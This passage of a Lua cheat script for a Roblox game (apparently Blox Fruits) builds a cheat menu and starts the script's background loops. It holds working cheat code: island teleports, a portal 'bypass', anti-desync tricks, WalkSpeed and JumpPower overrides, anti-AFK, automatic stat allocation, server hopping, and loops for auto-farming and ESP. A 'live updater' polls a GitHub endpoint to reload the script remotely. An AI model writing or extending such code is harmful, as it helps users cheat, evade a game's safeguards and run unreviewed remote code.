            ["Chocolate Island (Lv. 2300)"] = CFrame.new(141.52, 34.21, -12608.45),
            ["Candy Island (Lv. 2375)"] = CFrame.new(-1149.29, 23.63, -14445.61),
            ["Tiki Outpost (Lv. 2450)"] = CFrame.new(-16106.33, 9.21, 440.38),
            ["Temple of Time"] = CFrame.new(28282.57, 14896.85, 105.10)
        }
    }
    
    local CurrentIslands = AllIslands[CurrentSea] or AllIslands[1]
    local islandKeys = {}
    for k, _ in pairs(CurrentIslands) do table.insert(islandKeys, k) end
    table.sort(islandKeys)
    local SelIsland = islandKeys[1] or "Pirate Starter"
    
    local IslandDrop = TeleportTab:AddSearchDropdown("Select Island", islandKeys, islandKeys[1], function(v) SelIsland = v end)
    TeleportTab:AddButton("Teleport to Selected Island", function()
        _G.Config.AutoFarmLevel = false
        _G.Config.FarmSelectedMob = false
        _G.Config.FarmSelectedBoss = false
        _G.Config.FarmAllBosses = false
        local tcf = CurrentIslands[SelIsland]
        if tcf then TeleportToIsland(tcf, SelIsland) end
    end)
    TeleportTab:AddButton("Stop Travel & Hover Here", function()
        StopTween()
        local root = GetRoot()
        if root then HoverLock(root.CFrame) end
    end)
    TeleportTab:AddButton("Stop Travel & Land (Normal Ground)", function()
        ClearHover()
    end)
    
    TeleportTab:AddSection("Bypass & Anti-Desync Controls")
    TeleportTab:AddToggle("Instant Portal Bypass (requestEntrance)", _G.Config.BypassTeleport ~= false, function(v)
        _G.Config.BypassTeleport = v
    end)
    TeleportTab:AddToggle("Auto-Set Island Spawn on Arrival", _G.Config.AutoSetSpawn ~= false, function(v)
        _G.Config.AutoSetSpawn = v
    end)
    TeleportTab:AddToggle("Segmented Chunk Streaming (Anti-Lag)", _G.Config.WaypointFlight ~= false, function(v)
        _G.Config.WaypointFlight = v
    end)
    TeleportTab:AddButton("Force Anti-Desync Handshake", function()
        local root = GetRoot()
        if root then
            RecoverFromPhantomDesync(root.CFrame)
            print("[ALPHA] Server position handshake executed!")
        end
    end)
    
    TeleportTab:AddSection("Inter-Sea Travel")
    TeleportTab:AddButton("Travel to First Sea (Sea 1)", function()
        ShowLiveToast("SEA TRAVEL", "Traveling to First Sea...", Color3.fromRGB(0, 200, 255), 5)
        local cf = CommF()
        if cf then pcall(function() cf:InvokeServer("TravelMain") end) end
    end)
    TeleportTab:AddButton("Travel to Second Sea (Sea 2)", function()
        ShowLiveToast("SEA TRAVEL", "Traveling to Second Sea...", Color3.fromRGB(0, 200, 255), 5)
        local cf = CommF()
        if cf then pcall(function() cf:InvokeServer("TravelDressrosa") end) end
    end)
    TeleportTab:AddButton("Travel to Third Sea (Sea 3)", function()
        ShowLiveToast("SEA TRAVEL", "Traveling to Third Sea...", Color3.fromRGB(0, 200, 255), 5)
        local cf = CommF()
        if cf then pcall(function() cf:InvokeServer("TravelZou") end) end
    end)
    
    -- ==================== 12. SETTINGS ====================
    MiscTab:AddSection("Live Cloud & Auto-Updater")
    MiscTab:AddNotice("Connected to GitHub Live Engine (v" .. SCRIPT_VERSION .. ")", Color3.fromRGB(0, 230, 255))
    MiscTab:AddButton("Check for Live Updates Now", function()
        ShowLiveToast("CLOUD CHECK", "Polling GitHub live endpoint...", Color3.fromRGB(0, 230, 255), 3)
        task.spawn(function()
            local cfg = FetchRemoteConfig()
            if cfg then
                if cfg.latest_version and cfg.latest_version ~= SCRIPT_VERSION then
                    TriggerLiveReload(cfg.latest_version)
                else
                    ShowLiveToast("UP TO DATE", "Running latest version (v" .. SCRIPT_VERSION .. ")", Color3.fromRGB(100, 255, 150), 4)
                end
            else
                ShowLiveToast("OFFLINE", "Could not reach GitHub live endpoint", Color3.fromRGB(255, 100, 100), 4)
            end
        end)
    end)
    
    MiscTab:AddSection("Server Controls")
    MiscTab:AddButton("Server Hop (Lowest Pop & Best Ping)", function()
        task.spawn(function()
            ShowLiveToast("SERVER HOP", "Scanning servers for lowest population & best ping...", Color3.fromRGB(255, 255, 255), 3)
            local cursor = ""
            local candidates = {}
            local attempts = 0
            
            while #candidates < 20 and attempts < 4 do
                attempts = attempts + 1
                local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100" .. (cursor ~= "" and ("&cursor=" .. cursor) or "")
                local res = safeRequest and safeRequest({Url = url, Method = "GET"})
                if res and res.Body then
                    local ok, json = pcall(function() return HttpService:JSONDecode(res.Body) end)
                    if ok and json and json.data then
                        for _, s in ipairs(json.data) do
                            local playing = tonumber(s.playing) or 0
                            local maxP = tonumber(s.maxPlayers) or 12
                            -- Exclude private/empty/full/current servers
                            if playing >= 1 and playing < (maxP - 1) and s.id and s.id ~= game.JobId then
                                table.insert(candidates, s)
                            end
                        end
                        if json.nextPageCursor then
                            cursor = json.nextPageCursor
                        else
                            break
                        end
                    else
                        break
                    end
                else
                    break
                end
                task.wait(0.3)
            end
            
            if #candidates == 0 then
                ShowLiveToast("SERVER HOP", "No suitable public servers found, retrying...", Color3.fromRGB(255, 100, 100), 3)
                return
            end
            
            -- Sort by lowest population first, then best ping
            table.sort(candidates, function(a, b)
                local pingA = tonumber(a.ping) or 120
                local pingB = tonumber(b.ping) or 120
                local popA = tonumber(a.playing) or 99
                local popB = tonumber(b.playing) or 99
                if math.abs(popA - popB) <= 2 then
                    return pingA < pingB
                end
                return popA < popB
            end)
            
            -- Keep trying best candidates until successfully connected
            for idx, target in ipairs(candidates) do
                local pVal = target.ping and (tostring(target.ping) .. "ms") or "Good"
                ShowLiveToast("CONNECTING", string.format("Joining #%d (%d players | %s)...", idx, target.playing, pVal), Color3.fromRGB(255, 255, 255), 4)
                
                local failed = false
                local failConn
                failConn = TeleportService.TeleportInitFailed:Connect(function()
                    failed = true
                end)
                
                pcall(function()
                    TeleportService:TeleportToPlaceInstance(PlaceId, target.id, LocalPlayer)
                end)
                
                local t0 = tick()
                while (tick() - t0) < 4.5 do
                    if failed then break end
                    task.wait(0.2)
                end
                
                if failConn then failConn:Disconnect() end
                
                if not failed then
                    break
                else
                    ShowLiveToast("HOP RETRY", "Target unavailable, switching to next best server...", Color3.fromRGB(255, 200, 100), 2)
                    task.wait(0.5)
                end
            end
        end)
    end)
    MiscTab:AddButton("Rejoin Current Server", function()
        TeleportService:Teleport(PlaceId, LocalPlayer)
    end)
    MiscTab:AddToggle("Anti-AFK", true, function(v)
        _G.Config.AntiAFK = v
        if v then EnableAntiAFK() elseif AntiAFKConn then AntiAFKConn:Disconnect(); AntiAFKConn = nil end
    end)
    MiscTab:AddToggle("Anti-Desync Protection", _G.Config.AntiDesync ~= false, function(v)
        _G.Config.AntiDesync = v
    end)
    MiscTab:AddToggle("Auto-Set Spawn Point on Arrival", _G.Config.AutoSetSpawn ~= false, function(v)
        _G.Config.AutoSetSpawn = v
    end)
    MiscTab:AddSlider("Tween Flight Speed (Safe 200-240)", 150, 300, 220, function(v) _G.Config.TweenSpeed = v end)
    MiscTab:AddSlider("WalkSpeed", 16, 250, 16, function(v)
        local hum = GetHumanoid()
        if hum then hum.WalkSpeed = v end
    end)
    MiscTab:AddSlider("JumpPower", 50, 300, 50, function(v)
        local hum = GetHumanoid()
        if hum then hum.JumpPower = v end
    end)
    
    SwitchTab("Main Farm")
end


--============================== AUTO STATS ALLOCATOR ==============================
local function StartAutoStatsLoop()
    task.spawn(function()
        task.wait(2.0)
        while true do
            task.wait(0.5)
            if _G.Config.AutoStats and _G.Config.Stats then
                pcall(function()
                    local cf = CommF()
                    if not cf then return end
                    local lp = Players.LocalPlayer
                    local data = lp and lp:FindFirstChild("Data")
                    local ptsAvail = (data and data:FindFirstChild("Points") and data.Points.Value) or 0
                    if ptsAvail > 0 then
                        local pts = math.clamp(_G.Config.StatPoints or 1, 1, ptsAvail)
                        
                        -- Allocate according to user toggles in _G.Config.Stats
                        if _G.Config.Stats.Melee and ptsAvail > 0 then
                            local toAdd = math.min(pts, ptsAvail)
                            cf:InvokeServer("AddPoint", "Melee", toAdd)
                            ptsAvail = ptsAvail - toAdd
                            task.wait(0.08)
                        end
                        if _G.Config.Stats.Defense and ptsAvail > 0 then
                            local toAdd = math.min(pts, ptsAvail)
                            cf:InvokeServer("AddPoint", "Defense", toAdd)
                            ptsAvail = ptsAvail - toAdd
                            task.wait(0.08)
                        end
                        if _G.Config.Stats.Sword and ptsAvail > 0 then
                            local toAdd = math.min(pts, ptsAvail)
                            cf:InvokeServer("AddPoint", "Sword", toAdd)
                            ptsAvail = ptsAvail - toAdd
                            task.wait(0.08)
                        end
                        if _G.Config.Stats.Gun and ptsAvail > 0 then
                            local toAdd = math.min(pts, ptsAvail)
                            cf:InvokeServer("AddPoint", "Gun", toAdd)
                            ptsAvail = ptsAvail - toAdd
                            task.wait(0.08)
                        end
                        if _G.Config.Stats.Fruit and ptsAvail > 0 then
                            local toAdd = math.min(pts, ptsAvail)
                            cf:InvokeServer("AddPoint", "Demon Fruit", toAdd)
                            ptsAvail = ptsAvail - toAdd
                            task.wait(0.08)
                        end
                    end
                end)
            end
        end
    end)
end


--============================== STAGGERED INITIALIZATION ==============================
-- Step 1: UI first (immediate user feedback)
CreateUI()

-- Step 2: Start all background loops immediately (safely guarded)
if StartCombatLoop then task.spawn(StartCombatLoop) end
if StartHakiLoop then task.spawn(StartHakiLoop) end
if StartAutoFarmLevel then task.spawn(StartAutoFarmLevel) end
if StartAutoFarmSelectedMob then task.spawn(StartAutoFarmSelectedMob) end
if StartAutoFarmSelectedBoss then task.spawn(StartAutoFarmSelectedBoss) end
if StartAutoFarmAllBosses then task.spawn(StartAutoFarmAllBosses) end
if StartRaidBossLoop then task.spawn(StartRaidBossLoop) end
if StartDevilFruitLoops then task.spawn(StartDevilFruitLoops) end
if StartESPLoops then task.spawn(StartESPLoops) end
if StartChestFarmLoop then task.spawn(StartChestFarmLoop) end
if StartAutoStatsLoop then task.spawn(StartAutoStatsLoop) end
if StartAdvancedRaidEngine then task.spawn(StartAdvancedRaidEngine) end
if StartSeaEventsEngine then task.spawn(StartSeaEventsEngine) end
if StartRaceV4Engine then task.spawn(StartRaceV4Engine) end
if StartSpecialBossAndBoneEngine then task.spawn(StartSpecialBossAndBoneEngine) end
if StartLiveUpdaterLoop then task.spawn(StartLiveUpdaterLoop) end

print("--------------------------------------------------")
print("[ALPHA v2.9.5] Loaded successfully! (Stabilized Tween + Sea Patrol)")
print("[ALPHA v2.9.5] Auto Chest Farm (Map Scanner) & Mob Spawn-Wait Engine Active.")
print("[ALPHA v2.9.5] Current Location: " .. SeaName)
print("--------------------------------------------------")
